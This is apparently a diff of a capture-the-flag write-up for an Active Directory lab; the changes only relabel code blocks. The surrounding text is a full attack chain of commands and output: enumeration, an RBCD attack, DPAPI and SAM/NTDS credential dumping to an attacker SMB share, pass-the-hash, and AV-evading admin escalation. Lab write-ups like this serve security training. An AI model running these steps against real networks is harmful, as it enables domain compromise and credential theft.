@@ -29,7 +29,7 @@ image:
 
 Starting Credentials:
 
-```fortran
+```terminal
 _securitytestingsvc:4kCc$A@NZvNAdK@
 ```
 
@@ -41,7 +41,7 @@ _securitytestingsvc:4kCc$A@NZvNAdK@
 
 ### **NORTHDC01**
 
-```fortran
+```terminal
 PORT      STATE SERVICE       REASON          VERSION
 53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
 88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-11-20 15:55:20Z)
@@ -86,7 +86,7 @@ smb2-security-mode:
 
 ### **NORTHJMP01**
 
-```fortran
+```terminal
 PORT     STATE SERVICE       VERSION
 135/tcp  open  msrpc         Microsoft Windows RPC
 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
@@ -122,7 +122,7 @@ Host script results:
 
 ### /etc/hosts
 
-```fortran
+```terminal
 10.1.214.84 NORTHJMP01.northbridge.corp NORTHJMP01
 10.1.196.97 NORTHDC01.northbridge.corp NORTHDC01 northbridge.corp
 ```
@@ -131,7 +131,7 @@ Host script results:
 
 ## Initial Cred Validation (SMB)
 
-```fortran
+```terminal
 ┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
 └─# nxc smb targets.txt -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@'
 SMB         10.1.214.84     445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
@@ -150,7 +150,7 @@ Tried to enumerate shares via null session, and got the `STATUS_ACCESS_DENIED`
 
 We can try to enumerate users
 
-```fortran
+```terminal
 ┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
 └─# nxc smb targets.txt -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@' --users
 SMB         10.1.214.84     445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
@@ -194,7 +194,7 @@ There is a PAM running, and all the users receiving its protection. We can assum
 
 All in all, we do have a valid list of users on the domain. 
 
-```fortran
+```terminal
 Administrator
 Guest
 krbtgt
@@ -226,7 +226,7 @@ _svrautomationsvc
 
 Taking a look at the password policy:
 
-```fortran
+```terminal
 ┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
 └─# nxc smb targets.txt -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@' --pass-pol
 SMB         10.1.214.84     445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
@@ -267,7 +267,7 @@ There is no lockout threshold, in case we need to do any type of password sprayi
 
 ### Enumerating Shares
 
-```fortran
+```terminal
 ┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
 └─# nxc smb targets.txt -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@' --shares
 SMB         10.1.214.84     445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
@@ -295,7 +295,7 @@ We do find a share called `Network Shares` we can access
 
 ## Network Shares
 
-```fortran
+```terminal
 # Share Structure
 
 Archive
@@ -326,7 +326,7 @@ Last ditch effort, we notice that port 3389 is enabled. I went ahead and booted 
 
 Run a collector of your choosing and launch bloodhound. I’ll use rusthound here:
 
-```fortran
+```terminal
 rusthound-ce --domain northbridge.corp -f northdc01.northbridge.corp -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@'
 ```
 
@@ -356,7 +356,7 @@ However, what’s more interesting to us are the plaintext creds found in the Se
 
 We can try validating this using `nxc`:
 
-```fortran
+```terminal
 ┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
 └─# nxc smb targets.txt -u '_svrautomationsvc' -p 'y...'
 SMB         10.1.214.84     445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
@@ -383,7 +383,7 @@ In short, this privilege allows the service account to **change the security set
 
 First, we need to create a new computer account
 
-```fortran
+```terminal
 ┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
 └─# impacket-addcomputer -method LDAPS -computer-name 'SRV-FAKE$' -computer-pass 'Bermuda123@' -dc-host NORTHDC01 -domain-netbios NORTHBRIDGE 'northbridge.corp/_svrautomationsvc:yf......Vv'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
@@ -395,11 +395,11 @@ This simply means the command was successful, however, the user has exceeded the
 
 The readme we found gave us various hints using the keywords “Server Provisioning”. I took a look at bloodhound and found this OU:
 
-```fortran
+```terminal
 "OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp"
 ```
 
-```fortran
+```terminal
 ┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
 └─# impacket-addcomputer -method LDAPS -computer-name 'SRV-FAKE$' -computer-pass 'Bermuda123@' -dc-host NORTHDC01 -domain-netbios NORTHBRIDGE 'northbridge.corp/_svrautomationsvc:yf.....Vv' -computer-group 'OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
@@ -409,7 +409,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 We can now run an RBCD Attack:
 
-```fortran
+```terminal
 ┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
 └─# impacket-rbcd -delegate-from 'SRV-FAKE$' -delegate-to 'NORTHJMP01$' -action 'write' 'northbridge.corp/_svrautomationsvc:y...'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
@@ -427,7 +427,7 @@ We can try this against any one of the local admin users part of the `NORTHJMP01
 
 There’s 4 local admins. Just pick one and test:
 
-```fortran
+```terminal
 ┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
 └─# impacket-getST -spn "cifs/NORTHJMP01.northbridge.corp" -impersonate GCOOKT1 'northbridge.corp/SRV-FAKE$:Bermuda123@' -dc-ip 10.1.196.97
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
@@ -457,7 +457,7 @@ We got a hit!
 
 We can try dumping the LSASS (Local Security Authority Subsystem Service) or DPAPI (Data Protection API) 
 
-```fortran
+```terminal
 ┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
 └─# nxc smb targets.txt -u GCOOKT1 -k --use-kcache -M lsassy
 SMB         10.1.214.84     445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
@@ -470,7 +470,7 @@ Running nxc against 2 targets ━━━━━━━━━━━━━━━━�
 
 Dumping the LSASS didn’t work, but we did get a hit from DPAPI dump!!
 
-```fortran
+```terminal
 ┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
 └─# nxc smb targets.txt -u GCOOKT1 -k --use-kcache --dpapi
 SMB         10.1.196.97     445    NORTHDC01        [*] Windows Server 2022 Build 20348 x64 (name:NORTHDC01) (domain:northbridge.corp) (signing:True) (SMBv1:None) (Null Auth:True)
@@ -483,7 +483,7 @@ SMB         10.1.214.84     445    NORTHJMP01       [+] Got 64 decrypted masterk
 Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
 ```
 
-```fortran
+```terminal
 _backupsvc : j......5
 ```
 
@@ -497,11 +497,11 @@ This link provides a way to remotely save the SAM,SYSTEM,SECURITY files to a rem
 
 We start by creating a share and starting an smb server
 
-```fortran
+```terminal
 impacket-smbserver loot /home/cthulhu/hacksmarter/northbridge-systems -smb2support
 ```
 
-```fortran
+```terminal
 ┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
 └─# impacket-reg _backupsvc:'j......5'@10.1.196.97 backup -o '\\10.200.20.198\loot\'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
@@ -514,7 +514,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 ## Dumping Local SAM
 
-```fortran
+```terminal
 ┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
 └─# impacket-secretsdump -sam SAM.save -security SECURITY.save -system SYSTEM.save LOCAL
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
@@ -528,7 +528,7 @@ Administrator:500:a......e:1......8:::
 
 The hashes are local, but we are able to get the DC account hash here:
 
-```fortran
+```terminal
 $MACHINE.ACC: a...e:7...6
 ```
 
@@ -538,13 +538,13 @@ $MACHINE.ACC: a...e:7...6
 
 This link shows how to dump the NTDS.dit after you’ve gained control of the DC’s hash!
 
-```fortran
+```terminal
  impacket-secretsdump -hashes [redacted:redacted] -just-dc NORTHBRIDGE/'NORTHDC01$'@10.1.196.97
 ```
 
 ![image.png](/assets/northbridge_img/image%204.png)
 
-```fortran
+```terminal
 ┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
 └─# evil-winrm -i NORTHDC01 -u Administrator -H '8b61f9dfb32c8209f4ac9e2a5c2269cc'
 
@@ -567,7 +567,7 @@ Initially, I tried to login using GCOOKT1’s exported TGT via win-rm, but wasn�
 
 Then it hit me, netexec can run system commands!
 
-```fortran
+```terminal
 ┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
 └─# nxc smb NORTHJMP01 -u GCOOKT1 -k --use-kcache -X "pwd"
 SMB         NORTHJMP01      445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
@@ -580,7 +580,7 @@ But then we got caught by the AV.
 
 According to ChatGPT (yes :(( I used it here), you can add an existing user to the admins group through netexec!
 
-```fortran
+```terminal
 ┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
 └─# nxc smb NORTHJMP01 -u GCOOKT1 -k --use-kcache -X "net localgroup Administrators 'northbridge.corp\_securitytestingsvc' /add"
 SMB         NORTHJMP01      445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
@@ -593,7 +593,7 @@ And it gets caught again…
 
 Seems like tools like `net.exe` are being monitored. We need another powershell command that’s not being monitored. Had ChatGPT give me this alternative:
 
-```fortran
+```terminal
 ┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
 └─# nxc smb NORTHJMP01 -u GCOOKT1 -k --use-kcache -X "Add-LocalGroupMember -Group Administrators -Member '_securitytestingsvc@northbridge.corp'"
 SMB         NORTHJMP01      445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
@@ -607,6 +607,6 @@ This one works!!!
 
 Just run an evil-winrm and grab the user flag
 
-```fortran
+```terminal
 evil-winrm -i NORTHJMP01 -u _securitytestingsvc -p '4kCc$A@NZvNAdK@'
 ```
